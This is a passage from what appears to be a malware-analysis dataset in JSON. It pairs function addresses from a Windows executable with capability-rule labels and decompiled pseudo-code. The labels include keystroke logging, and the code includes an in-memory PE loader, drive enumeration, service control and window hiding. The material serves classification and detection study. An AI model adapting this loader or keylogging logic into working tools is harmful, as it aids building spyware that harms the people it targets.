            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045d1bc(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    piVar3 = arg_8h + -4;\n    iVar1 = *(*piVar3 + 0x18);\n    if (*(*(*(*piVar3 + 0x60) + 0x14) + 0x10) == '\\x01') {\n        iVar2 = fcn.0045a570();\n        if (*(*piVar3 + 0x54) <= iVar2 + iVar1) {\n            *(*piVar3 + 0x54) = iVar2 + iVar1;\n        }\n        iVar2 = fcn.0045ca20();\n        if (iVar2 - iVar1 <= *(*piVar3 + 0x54)) {\n            *(*piVar3 + 0x54) = iVar2 - iVar1;\n        }\n    }\n    else {\n        iVar2 = fcn.0045a570();\n        if (*(*piVar3 + 0x50) <= iVar2 + iVar1) {\n            *(*piVar3 + 0x50) = iVar2 + iVar1;\n        }\n        iVar2 = fcn.0045ca20();\n        if (iVar2 - iVar1 <= *(*piVar3 + 0x50)) {\n            *(*piVar3 + 0x50) = iVar2 - iVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 326
    },
    "0045d404": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045d404(uint param_1, char param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 4) = 1;\n    *(in_EAX + 8) = 5;\n    if (((**0x4927cc == 2) && (3 < **0x492410)) ||\n       ((**0x4927cc == 1 && ((4 < **0x492410 || ((**0x492410 == 4 && (9 < **0x492640)))))))) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = 0;\n    }\n    *(in_EAX + 0xd) = uVar1;\n    fcn.0045d5f4();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 279
    },
    "0045d538": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045d538(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = (***0x492428)(0x13);\n    *(in_EAX + 0xc) = '\\x01' - (iVar1 == 0);\n    return;\n}\n",
        "token_count": 70
    },
    "0045d554": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045d554(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char cVar2;\n    \n    iVar1 = (***0x492428)(0x4b);\n    cVar2 = '\\x01' - (iVar1 == 0);\n    *(in_EAX + 0x20) = cVar2;\n    if (cVar2 != '\\0') {\n        sub.user32.dll_SystemParametersInfoA(0x68, 0, in_EAX + 0x10, 0);\n    }\n    return;\n}\n",
        "token_count": 129
    },
    "00463ffc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00463ffc(int32_t param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 9) = 0;\n    *(in_EAX + 8) = 0;\n    *(in_EAX + 0x24) = 0;\n    *(in_EAX + 0x18) = 0;\n    *(in_EAX + 0x1c) = 0;\n    *(in_EAX + 0x20) = 0;\n    if (param_1 == 0) {\n        param_1 = 1;\n    }\n    *(in_EAX + 0x30) = param_1;\n    fcn.00406928(param_1);\n    fcn.00463f7c();\n    *(in_EAX + 0x38) = 0x696;\n    *(in_EAX + 0x40) = 0;\n    *(in_EAX + 0x44) = 0;\n    *(in_EAX + 10) = 0;\n    uVar1 = fcn.004210c0(fcn.00463ec0, in_EAX);\n    *(in_EAX + 0x34) = uVar1;\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x1c4c) = uVar1;\n    uVar2 = 0;\n    uVar1 = fcn.0042ed3c(0, 0x4640d8, 0, 0);\n    *(in_EAX + 0x1c50) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 490
    },
    "00465968": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.00465968(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t *arg_8h;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar6;\n    int32_t *piVar7;\n    int32_t *piVar8;\n    int32_t *in_stack_fffffe7c;\n    int32_t *piStack348;\n    uint uStack344;\n    uchar *puStack340;\n    int32_t var_140h;\n    uint32_t lpAddress;\n    uint dwSize;\n    uint var_ech;\n    uint var_48h;\n    int32_t *var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack340 = &stack0xfffffffc;\n    var_4h = NULL;\n    uStack344 = 0x465be3;\n    piStack348 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack348;\n    fcn.00408550();\n    if (var_48h == 0x5a4d) {\n        piVar6 = var_ch;\n        fcn.00465210(var_ch, var_ch >> 0x1f);\n        fcn.00408550();\n        if (var_140h == 0x4550) {\n            uVar2 = sub.kernel32.dll_VirtualAlloc_1(lpAddress, dwSize, 0x2000, 4);\n            if (uVar2 == 0) {\n                in_stack_fffffe7c = NULL;\n                uVar2 = sub.kernel32.dll_VirtualAlloc_1(0, dwSize, 0x2000, 4);\n            }\n            if (uVar2 == 0) {\n                fcn.00405584();\n                *in_FS_OFFSET = in_stack_fffffe7c;\n            }\n            else {\n                uVar3 = sub.kernel32.dll_GetProcessHeap(0, 0x11);\n                arg_8h = sub.kernel32.dll_HeapAlloc(uVar3);\n                arg_8h[1] = uVar2;\n                arg_8h[3] = 0;\n                arg_8h[2] = 0;\n                *(arg_8h + 4) = 0;\n                sub.kernel32.dll_VirtualAlloc_1(uVar2, dwSize, 0x1000, 4);\n                iVar4 = sub.kernel32.dll_VirtualAlloc_1(uVar2, var_ech, 0x1000, 4);\n                fcn.00408550();\n                *arg_8h = var_ch + iVar4;\n                *(var_ch + iVar4 + 0x34) = uVar2;\n                fcn.00465304();\n                piVar6 = uVar2 - lpAddress;\n                piVar7 = piVar6;\n                piVar8 = -(uVar2 < lpAddress);\n                if (piVar6 != NULL) {\n                    piVar7 = arg_8h;\n                    fcn.00465408(arg_8h, piVar6);\n                    piVar8 = piVar6;\n                }\n                piVar6 = arg_8h;\n                cVar1 = fcn.004654f4(arg_8h);\n                if (cVar1 == '\\0') {\n                    fcn.00405818(piVar6, piVar7, piVar8);\n                    fcn.00465f94();\n                    *in_FS_OFFSET = piVar6;\n                }\n                else {\n                    piVar6 = arg_8h;\n                    fcn.00465850(arg_8h);\n                    if (*(*arg_8h + 0x28) != 0) {\n                        pcVar5 = *(*arg_8h + 0x28) + uVar2;\n                        if (pcVar5 == NULL) {\n                            fcn.00405584();\n                            fcn.00465f94();\n                            *in_FS_OFFSET = piVar6;\n                            return NULL;\n                        }\n                        iVar4 = (*pcVar5)(uVar2, 1, 0);\n                        if (iVar4 == 0) {\n                            fcn.00405584();\n                            fcn.00465f94();\n                            *in_FS_OFFSET = piVar6;\n                            return NULL;\n                        }\n                        *(arg_8h + 4) = 1;\n                    }\n                    *in_FS_OFFSET = piVar6;\n                    var_4h = arg_8h;\n                }\n            }\n        }\n        else {\n            fcn.00405584();\n            *in_FS_OFFSET = piVar6;\n        }\n    }\n    else {\n        fcn.00405584();\n        *in_FS_OFFSET = piStack348;\n    }\n    return var_4h;\n}\n",
        "token_count": 1065
    },
    "00466c38": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00466c38(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iStack300;\n    \n    iVar1 = fcn.00460c98();\n    if ((iVar1 != -1) && (iVar1 = fcn.00460cb8(0x128),  iVar1 != 0)) {\n        while (iVar1 = fcn.00460cd8(),  iVar1 != 0) {\n            if (in_EAX == iStack300) {\n                fcn.004057a0();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 135
    },
    "00467cc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.00467cc0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint unaff_EBX;\n    uint *in_FS_OFFSET;\n    uchar uVar4;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_ch = 5;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_20h = 0x467e01;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00467cc0::var_24h;\n    cVar3 = 'A';\n    var_10h = unaff_EBX;\n    do {\n        fcn.00405718();\n        fcn.00405818();\n        uVar1 = fcn.004059dc();\n        iVar2 = sub.kernel32.dll_GetDriveTypeA(uVar1);\n        uVar4 = iVar2 == 1;\n        if (1 < iVar2) {\n            fcn.00488388();\n            fcn.0040a5c4();\n            fcn.00409b6c();\n            var_24h = CONCAT31(CONCAT21(var_24h._2_2_, cVar3), 1);\n            fcn.004039a0(var_10h);\n            fcn.00403970();\n            fcn.00405794();\n            fcn.00409b6c();\n            fcn.00405974();\n            if (uVar4) {\n                fcn.004055c8();\n            }\n            else {\n                fcn.004055c8();\n            }\n            uVar1 = var_4h;\n            fcn.00405718(var_4h);\n            fcn.004058e0(0x467e48, var_8h, 0x467e3c, 0x467e18, uVar1);\n        }\n        cVar3 = cVar3 + '\\x01';\n    } while (cVar3 != '[');\n    fcn.00405584();\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x467e08;\n    var_20h = 0x467df3;\n    fcn.00405530();\n    var_20h = 0x467e00;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 690
    },
    "00467e7c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.00467e7c(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.004059dc(0);\n    iVar2 = sub.kernel32.dll_CreateDirectoryA(uVar1);\n    return iVar2 != 0;\n}\n",
        "token_count": 65
    },
    "00467e98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.00467e98(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.004059dc();\n    uVar1 = fcn.004059dc(uVar1);\n    iVar2 = sub.kernel32.dll_MoveFileA(uVar1);\n    return iVar2 != 0;\n}\n",
        "token_count": 77
    },
    "00468270": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00468270(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uStack592;\n    uint uStack588;\n    uchar *puStack584;\n    uint var_234h;\n    uint var_230h;\n    uint var_218h;\n    uint var_110h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack584 = &stack0xfffffffc;\n    uStack588 = 0x468389;\n    uStack592 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdb0;\n    fcn.00405530();\n    uVar1 = fcn.00460c98();\n    iVar2 = fcn.00460cf8();\n    while (iVar2 != 0) {\n        fcn.00409e74();\n        uVar4 = 0;\n        uVar3 = var_218h;\n        fcn.00409e9c(var_218h);\n        fcn.004057a0(0, uVar3, uVar4);\n        uStack592 = 0x4683c4;\n        fcn.004058e0();\n        iVar2 = fcn.00460d18();\n    }\n    sub.kernel32.dll_CloseHandle_1();\n    fcn.00405584();\n    *in_FS_OFFSET = uVar1;\n    uStack588 = 0x468390;\n    uStack592 = 0x46837b;\n    fcn.00405530();\n    uStack592 = 0x468388;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 376
    },
    "00468f24": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __fastcall fcn.00468f24(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t unaff_EDI;\n    uint *in_FS_OFFSET;\n    uint var_150h;\n    uchar *var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint arg_8h;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    iVar2 = 0x29;\n    do {\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_10h = NULL;\n    puStack36 = 0x468f4c;\n    var_1ch = unaff_EDI;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack36 = 0x468f54;\n    fcn.004059cc();\n    uStack40 = 0x46928e;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x468f6a;\n    puStack36 = &stack0xfffffffc;\n    fcn.00405530();\n    puStack48 = 0x468f76;\n    var_14h = fcn.00421644();\n    puStack48 = 0x468f85;\n    var_18h = fcn.00404620();\n    puStack48 = 0x468f90;\n    fcn.00409ecc();\n    puStack48 = 0x468f95;\n    fcn.00468e18();\n    uStack52 = 0x469252;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack64 = 0x469241;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack48 = &stack0xfffffffc;\n    fcn.00421720();\n    fcn.00421864();\n    fcn.00421e20();\n    iVar2 = (**(*var_18h + 0x14))();\n    if (-1 < iVar2 + -1) {\n        do {\n            var_1ch = iVar2;\n            (**(*var_18h + 0xc))();\n            cVar1 = fcn.00421f60();\n            if (cVar1 == '\\x01') {\n                fcn.004055c8();\n                (**(*var_18h + 0xc))(*var_10h);\n                (**(*var_18h + 0xc))(0x4692b4, var_ch, 0x4692b4, var_124h);\n                uStack64 = 0x469068;\n                fcn.00421fe8();\n                uStack64 = var_128h;\n                uStack68 = 0x4692c0;\n                fcn.004058e0();\n            }\n            else if (cVar1 == '\\x03') {\n                fcn.004055c8();\n                (**(*var_18h + 0xc))(*var_10h);\n                (**(*var_18h + 0xc))(0x4692b4, var_ch, 0x4692b4, var_130h);\n                uStack64 = 0x4690dd;\n                fcn.00422074();\n                uStack64 = 0x4690e8;\n                fcn.00409d60();\n                uStack64 = var_134h;\n                uStack68 = 0x4692c0;\n                fcn.004058e0();\n            }\n            else if (cVar1 == '\\x02') {\n                fcn.004055c8();\n                (**(*var_18h + 0xc))(*var_10h);\n                (**(*var_18h + 0xc))(0x4692b4, var_ch, 0x4692b4, var_13ch);\n                uStack64 = 0x469160;\n                fcn.00421fe8();\n                uStack64 = var_140h;\n                uStack68 = 0x4692c0;\n                fcn.004058e0();\n            }\n            if (cVar1 == '\\x04') {\n                arg_8h = 0x100;\n                (**(*var_18h + 0xc))();\n                iVar2 = fcn.004220a4(arg_8h);\n                if (0 < iVar2) {\n                    fcn.004055c8();\n                }\n                (**(*var_18h + 0xc))(*var_10h);\n                puStack48 = var_14ch;\n                uStack52 = 0x4692b4;\n                uStack56 = var_ch;\n                puStack60 = 0x4692b4;\n                uStack64 = 0x4691f9;\n                fcn.004057a0();\n                uStack64 = var_150h;\n                uStack68 = 0x4692c0;\n                fcn.004058e0();\n            }\n            var_1ch = var_1ch + -1;\n            iVar2 = var_1ch;\n        } while (var_1ch != 0);\n    }\n    *in_FS_OFFSET = uStack68;\n    puStack60 = 0x469248;\n    uStack64 = 0x469230;\n    fcn.004216f0();\n    uStack64 = 0x469238;\n    fcn.00404650();\n    uStack64 = 0x469240;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 1475
    },
    "0046a544": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0046a544(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    puStack32 = &fcn.0046a544::var_1h + 1;\n    puStack44 = &fcn.0046a544::var_1h + 1;\n    uStack36 = 0x46a5d0;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    var_1h._0_1_ = 0;\n    uStack48 = 0x46a5a9;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    fcn.0045ea34(&fcn.0046a544::var_8h);\n    (**(_pe_dos_header + 0x78))();\n    fcn.0040711c();\n    if (var_8h == -2) {\n        var_1h._0_1_ = 0;\n    }\n    *in_FS_OFFSET = 0;\n    *in_FS_OFFSET = uStack48;\n    uStack40 = 0x46a5d7;\n    puStack44 = 0x46a5cf;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 365
    },
    "0046b340": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046b340(void)\n\n{\n    char in_AL;\n    \n    fcn.00421644();\n    fcn.00421720();\n    fcn.00421864();\n    fcn.00421864();\n    fcn.00421864();\n    fcn.00421864();\n    fcn.00421864();\n    fcn.00421864();\n    if (in_AL == '\\x01') {\n        fcn.00421f88();\n    }\n    else if (in_AL == '\\0') {\n        fcn.00421cd0();\n    }\n    fcn.004216f0();\n    return;\n}\n",
        "token_count": 139
    },
    "0046b47c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "find graphical window",
            "find taskbar"
        ],
        "decompiled_code": "\nvoid fcn.0046b47c(void)\n\n{\n    char in_AL;\n    uint uVar1;\n    \n    if (in_AL == '\\x01') {\n        uVar1 = sub.user32.dll_FindWindowA(0x46b4d4, 0, 0, 0x46b4cc, 0, 0xffffffff);\n        uVar1 = sub.user32.dll_FindWindowExA(uVar1);\n        sub.user32.dll_EnableWindow(uVar1);\n        return;\n    }\n    if (in_AL == '\\0') {\n        uVar1 = sub.user32.dll_FindWindowA(0x46b4d4, 0, 0, 0x46b4cc, 0, 0);\n        uVar1 = sub.user32.dll_FindWindowExA(uVar1);\n        sub.user32.dll_EnableWindow(uVar1);\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "0046b55c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046b55c(void)\n\n{\n    char in_AL;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iVar4;\n    int32_t iStack160;\n    uint uStack156;\n    uchar *puStack152;\n    uint var_88h;\n    uint lpClassName;\n    uint var_4h;\n    \n    puStack152 = &stack0xfffffffc;\n    uStack156 = 0x46b626;\n    iStack160 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack160;\n    iVar1 = sub.user32.dll_FindWindowA(0x46b634, 0);\n    iVar2 = sub.user32.dll_GetWindow(iVar1, 5);\n    while (iVar4 = iVar2,  iVar4 != 0) {\n        iVar1 = iVar4;\n        iVar2 = sub.user32.dll_GetClassNameA();\n        uVar3 = iVar2 == 0;\n        if (0 < iVar2) {\n            fcn.0040aa98();\n            fcn.004097cc();\n            fcn.00405974();\n            if (uVar3) {\n                if (in_AL == '\\x01') {\n                    iVar1 = iVar4;\n                    sub.user32.dll_ShowWindow();\n                }\n                else {\n                    iVar1 = iVar4;\n                    sub.user32.dll_ShowWindow();\n                }\n            }\n        }\n        iVar2 = sub.user32.dll_GetWindow(iVar4, 2, iVar1);\n        iVar1 = iVar4;\n    }\n    *in_FS_OFFSET = iVar1;\n    fcn.00405530(0x46b62d);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 383
    },
    "0046b924": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046b924(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t in_EDX;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY124;\n    int32_t iStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint lpServiceStatus;\n    uint var_28h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack64 = 0x46b941;\n    var_8h = in_EDX;\n    fcn.004059cc();\n    uStack68 = 0x46ba0a;\n    iStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    fcn.00405530();\n    var_28h = 0;\n    var_10h = 0;\n    iVar1 = sub.advapi32.dll_OpenSCManagerA(0, 0, 0xf003f);\n    if (iVar1 != 0) {\n        if (var_ch == 0) {\n            uVar4 = 0x20;\n        }\n        else {\n            uVar4 = 0x10;\n        }\n        uVar2 = fcn.004059dc(uVar4 | 4);\n        iVar3 = sub.advapi32.dll_OpenServiceA(iVar1, uVar2);\n        if (iVar3 != 0) {\n            if (var_8h != 0) {\n                if (var_ch == 0) {\n                    sub.advapi32.dll_ControlService(iVar3, 1, &fcn.0046b924::lpServiceStatus);\n                }\n                else {\n                    sub.advapi32.dll_StartServiceA(iVar3, 0, &fcn.0046b924::var_10h);\n                }\n            }\n            sub.advapi32.dll_QueryServiceStatus(iVar3, &fcn.0046b924::lpServiceStatus);\n            sub.advapi32.dll_CloseServiceHandle(iVar3);\n        }\n        sub.advapi32.dll_CloseServiceHandle();\n        iStackY124 = iVar1;\n    }\n    fcn.0046b7ec();\n    *in_FS_OFFSET = iStackY124;\n    fcn.00405530(0x46ba11);\n    return;\n}\n",
        "token_count": 547
    },
    "0046e8d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0046e8d8(uint32_t param_1, uint8_t *param_2)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    int32_t iVar17;\n    uint32_t uVar18;\n    \n    uVar18 = in_EAX >> 0x10;\n    uVar2 = in_EAX & 0xffff;\n    if (param_1 == 1) {\n        uVar2 = uVar2 + *param_2;\n        if (0xfff0 < uVar2) {\n            uVar2 = uVar2 - 0xfff1;\n        }\n        uVar18 = uVar18 + uVar2;\n        if (0xfff0 < uVar18) {\n            uVar18 = uVar18 - 0xfff1;\n        }\n        uVar2 = uVar18 << 0x10 | uVar2;\n    }\n    else if (param_2 == NULL) {\n        uVar2 = 1;\n    }\n    else if (param_1 < 0x10) {\n        while (param_1 != 0) {\n            uVar2 = uVar2 + *param_2;\n            param_2 = param_2 + 1;\n            uVar18 = uVar18 + uVar2;\n            param_1 = param_1 - 1;\n        }\n        if (0xfff0 < uVar2) {\n            uVar2 = uVar2 - 0xfff1;\n        }\n        uVar2 = uVar18 % 0xfff1 << 0x10 | uVar2;\n    }\n    else {\n        if (0x15af < param_1) {\n            do {\n                param_1 = param_1 - 0x15b0;\n                iVar1 = 0x15b;\n                do {\n                    iVar3 = uVar2 + *param_2;\n                    iVar4 = iVar3 + param_2[1];\n                    iVar5 = iVar4 + param_2[2];\n                    iVar6 = iVar5 + param_2[3];\n                    iVar7 = iVar6 + param_2[4];\n                    iVar8 = iVar7 + param_2[5];\n                    iVar9 = iVar8 + param_2[6];\n                    iVar10 = iVar9 + param_2[7];\n                    iVar11 = iVar10 + param_2[8];\n                    iVar12 = iVar11 + param_2[9];\n                    iVar13 = iVar12 + param_2[10];\n                    iVar14 = iVar13 + param_2[0xb];\n                    iVar15 = iVar14 + param_2[0xc];\n                    iVar16 = iVar15 + param_2[0xd];\n                    iVar17 = iVar16 + param_2[0xe];\n                    uVar2 = iVar17 + param_2[0xf];\n                    uVar18 = uVar18 + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11 + iVar12 +\n                             iVar13 + iVar14 + iVar15 + iVar16 + iVar17 + uVar2;\n                    param_2 = param_2 + 0x10;\n                    iVar1 = iVar1 + -1;\n                } while (iVar1 != 0);\n                uVar2 = uVar2 % 0xfff1;\n                uVar18 = uVar18 % 0xfff1;\n            } while (0x15af < param_1);\n        }\n        if (param_1 != 0) {\n            for (; 0xf < param_1; param_1 = param_1 - 0x10) {\n                iVar1 = uVar2 + *param_2;\n                iVar3 = iVar1 + param_2[1];\n                iVar4 = iVar3 + param_2[2];\n                iVar5 = iVar4 + param_2[3];\n                iVar6 = iVar5 + param_2[4];\n                iVar7 = iVar6 + param_2[5];\n                iVar8 = iVar7 + param_2[6];\n                iVar9 = iVar8 + param_2[7];\n                iVar10 = iVar9 + param_2[8];\n                iVar11 = iVar10 + param_2[9];\n                iVar12 = iVar11 + param_2[10];\n                iVar13 = iVar12 + param_2[0xb];\n                iVar14 = iVar13 + param_2[0xc];\n                iVar15 = iVar14 + param_2[0xd];\n                iVar16 = iVar15 + param_2[0xe];\n                uVar2 = iVar16 + param_2[0xf];\n                uVar18 = uVar18 + iVar1 + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11 +\n                         iVar12 + iVar13 + iVar14 + iVar15 